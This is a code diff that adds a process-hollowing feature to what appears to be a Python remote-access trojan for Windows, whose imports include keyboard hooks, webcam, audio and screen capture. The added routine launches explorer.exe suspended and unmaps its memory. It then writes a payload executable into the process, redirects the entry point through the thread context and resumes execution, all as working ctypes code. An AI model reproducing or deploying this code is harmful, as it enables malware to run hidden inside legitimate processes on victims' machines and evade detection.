@@ -17,10 +17,12 @@ import time
 import wave
 import winreg
 from ctypes import wintypes
+from ctypes.wintypes import DWORD, WORD, BYTE, LPVOID
 
 import PyHook3
 import cv2
 import ntsecuritycon
+import pefile
 import psutil
 import pyaudio
 import pyautogui
@@ -513,6 +515,17 @@ class ClientUtil:
         except Exception as exception:
             client_obj.send('[-] Error: ' + str(exception))
 
+    @staticmethod
+    def runpe():
+        try:
+            payload_executable = r'test.exe'
+            target_executable = r'C:\Windows\explorer.exe'
+            if not os.path.isfile(payload_executable) or not os.path.isfile(target_executable):
+                return '[-] File not found'
+            return process_hollowing(payload_executable, target_executable)
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
 
 def get_time():
     return str(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))
@@ -796,6 +809,228 @@ def get_history(db):
     conn.close()
     if os.path.isfile('history.db'):
         os.remove('history.db')
+    return result
+
+
+DWORD64 = ctypes.c_ulonglong
+
+
+class M128A(ctypes.Structure):
+    _fields_ = [
+        ('Low', DWORD64),
+        ('High', DWORD64)
+    ]
+
+
+class XMM_SAVE_AREA32(ctypes.Structure):
+    _pack_ = 1
+    _fields_ = [
+        ('ControlWord', WORD),
+        ('StatusWord', WORD),
+        ('TagWord', BYTE),
+        ('Reserved1', BYTE),
+        ('ErrorOpcode', WORD),
+        ('ErrorOffset', DWORD),
+        ('ErrorSelector', WORD),
+        ('Reserved2', WORD),
+        ('DataOffset', DWORD),
+        ('DataSelector', WORD),
+        ('Reserved3', WORD),
+        ('MxCsr', DWORD),
+        ('MxCsr_Mask', DWORD),
+        ('FloatRegisters', M128A * 8),
+        ('XmmRegisters', M128A * 16),
+        ('Reserved4', BYTE * 96)
+    ]
+
+
+class DUMMYSTRUCTNAME(ctypes.Structure):
+    _fields_ = [
+        ('Header', M128A * 2),
+        ('Legacy', M128A * 8),
+        ('Xmm0', M128A),
+        ('Xmm1', M128A),
+        ('Xmm2', M128A),
+        ('Xmm3', M128A),
+        ('Xmm4', M128A),
+        ('Xmm5', M128A),
+        ('Xmm6', M128A),
+        ('Xmm7', M128A),
+        ('Xmm8', M128A),
+        ('Xmm9', M128A),
+        ('Xmm10', M128A),
+        ('Xmm11', M128A),
+        ('Xmm12', M128A),
+        ('Xmm13', M128A),
+        ('Xmm14', M128A),
+        ('Xmm15', M128A),
+    ]
+
+
+class DUMMYUNIONNAME(ctypes.Structure):
+    _fields_ = [
+        ('FltSave', XMM_SAVE_AREA32),
+        ('DummpyStruct', DUMMYSTRUCTNAME)
+    ]
+
+
+class CONTEXT(ctypes.Structure):
+    _pack_ = 16
+    _fields_ = [
+        ('P1Home', DWORD64),
+        ('P2Home', DWORD64),
+        ('P3Home', DWORD64),
+        ('P4Home', DWORD64),
+        ('P5Home', DWORD64),
+        ('P6Home', DWORD64),
+        ('ContextFlags', DWORD),
+        ('MxCsr', DWORD),
+        ('SegCs', WORD),
+        ('SegDs', WORD),
+        ('SegEs', WORD),
+        ('SegFs', WORD),
+        ('SegGs', WORD),
+        ('SegSs', WORD),
+        ('EFlags', DWORD),
+        ('Dr0', DWORD64),
+        ('Dr1', DWORD64),
+        ('Dr2', DWORD64),
+        ('Dr3', DWORD64),
+        ('Dr6', DWORD64),
+        ('Dr7', DWORD64),
+        ('Rax', DWORD64),
+        ('Rcx', DWORD64),
+        ('Rdx', DWORD64),
+        ('Rbx', DWORD64),
+        ('Rsp', DWORD64),
+        ('Rbp', DWORD64),
+        ('Rsi', DWORD64),
+        ('Rdi', DWORD64),
+        ('R8', DWORD64),
+        ('R9', DWORD64),
+        ('R10', DWORD64),
+        ('R11', DWORD64),
+        ('R12', DWORD64),
+        ('R13', DWORD64),
+        ('R14', DWORD64),
+        ('R15', DWORD64),
+        ('Rip', DWORD64),
+        ('DUMMYUNIONNAME', DUMMYUNIONNAME),
+        ('VectorRegister', M128A * 26),
+        ('VectorControl', DWORD64),
+        ('DebugControl', DWORD64),
+        ('LastBranchToRip', DWORD64),
+        ('LastBranchFromRip', DWORD64),
+        ('LastExceptionToRip', DWORD64),
+        ('LastExceptionFromRip', DWORD64),
+    ]
+
+
+def process_hollowing(payload_executable, target_executable):
+    result = ''
+    startup_info = STARTUPINFO()
+    startup_info.cb = ctypes.sizeof(startup_info)
+    process_info = PROCESS_INFORMATION()
+    if ctypes.windll.kernel32.CreateProcessA(
+            None,
+            ctypes.create_string_buffer(bytes(target_executable, encoding='ascii')),
+            None,
+            None,
+            False,
+            0x00000004,
+            None,
+            None,
+            ctypes.byref(startup_info),
+            ctypes.byref(process_info)
+    ) == 0:
+        result += '[-] Error creating process: ' + target_executable + '\n'
+        return result
+    result += '[+] Process created in suspended state: {0} (PID: {1})'.format(target_executable,
+                                                                              process_info.dwProcessId) + '\n'
+    result += '[*] Reading {0} into memory'.format(payload_executable) + '\n'
+    payload_pe = pefile.PE(payload_executable)
+    with open(payload_executable, 'rb') as f:
+        payload_data = f.read()
+    result += '[*] Getting thread context\n'
+    context = CONTEXT()
+    context.ContextFlags = 0x10007
+    if ctypes.windll.kernel32.GetThreadContext(process_info.hThread, ctypes.byref(context)) == 0:
+        result += '[-] Error in GetThreadContext: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
+        return result
+    result += '[*] Reading base address of target process\n'
+    target_image_base = LPVOID()
+    if ctypes.windll.kernel32.ReadProcessMemory(
+            process_info.hProcess,
+            LPVOID(context.Rdx + 2 * ctypes.sizeof(ctypes.c_size_t)),
+            ctypes.byref(target_image_base),
+            ctypes.sizeof(LPVOID),
+            None
+    ) == 0:
+        result += '[-] Error in ReadProcessMemory: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
+        return result
+    result += '[+] Base address of target process: {0}'.format(hex(target_image_base.value)) + '\n'
+
+    result += '[*] Unmapping memory of target process\n'
+    if target_image_base == payload_pe.OPTIONAL_HEADER.ImageBase:
+        if ctypes.windll.ntdll.NtUnmapViewOfSection(process_info.hProcess, target_image_base) == 0:
+            result += '[-] Error in NtUnmapViewOfSection: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
+            return result
+    result += '[*] Allocating memory in target process\n'
+    ctypes.windll.kernel32.VirtualAllocEx.restype = LPVOID
+    allocated_address = ctypes.windll.kernel32.VirtualAllocEx(
+        process_info.hProcess,
+        LPVOID(payload_pe.OPTIONAL_HEADER.ImageBase),
+        payload_pe.OPTIONAL_HEADER.SizeOfImage,
+        0x1000 | 0x2000,
+        0x40
+    )
+    if allocated_address == 0:
+        result += '[-] Error in VirtualAllocEx: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
+        return result
+    result += '[+] Allocated memory at: {0}'.format(hex(allocated_address)) + '\n'
+    result += '[*] Writing payload headers to target process\n'
+    if ctypes.windll.kernel32.WriteProcessMemory(process_info.hProcess,
+                                                 LPVOID(allocated_address),
+                                                 payload_data,
+                                                 payload_pe.OPTIONAL_HEADER.SizeOfHeaders,
+                                                 None
+                                                 ) == 0:
+        result += '[-] Error in WriteProcessMemory: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
+        return result
+    result += '[*] Writing payload sections to target process\n'
+    for section in payload_pe.sections:
+        section_name = section.Name.decode('utf-8').strip('\x00')
+        result += '[*] Writing section {0} (to {1})'.format(section_name,
+                                                            hex(allocated_address + section.VirtualAddress)) + '\n'
+        if ctypes.windll.kernel32.WriteProcessMemory(process_info.hProcess,
+                                                     LPVOID(allocated_address + section.VirtualAddress),
+                                                     payload_data[section.PointerToRawData:],
+                                                     section.SizeOfRawData,
+                                                     None
+                                                     ) == 0:
+            result += '[-] Error in WriteProcessMemory: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
+            return result
+    result += '[*] Setting new entrypoint\n'
+    context.Rcx = allocated_address + payload_pe.OPTIONAL_HEADER.AddressOfEntryPoint
+    result += '[+] New entrypoint: ' + str(hex(context.Rcx)) + '\n'
+    result += '[*] Writing base address of payload to target process\n'
+    if ctypes.windll.kernel32.WriteProcessMemory(process_info.hProcess,
+                                                 LPVOID(context.Rdx + 2 * ctypes.sizeof(ctypes.c_size_t)),
+                                                 payload_data[
+                                                 payload_pe.OPTIONAL_HEADER.get_field_absolute_offset("ImageBase"):],
+                                                 ctypes.sizeof(LPVOID),
+                                                 None
+                                                 ) == 0:
+        result += '[-] Error in WriteProcessMemory: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
+        return result
+    result += '[*] Setting modified context\n'
+    if ctypes.windll.kernel32.SetThreadContext(process_info.hThread, ctypes.byref(context)) == 0:
+        result += '[-] Error in SetThreadContext: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
+        return result
+    result += '[*] Resuming context\n'
+    if ctypes.windll.kernel32.ResumeThread(process_info.hThread) == 0:
+        result += '[-] Error in ResumeThread: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
+        return result
     return result
 
 
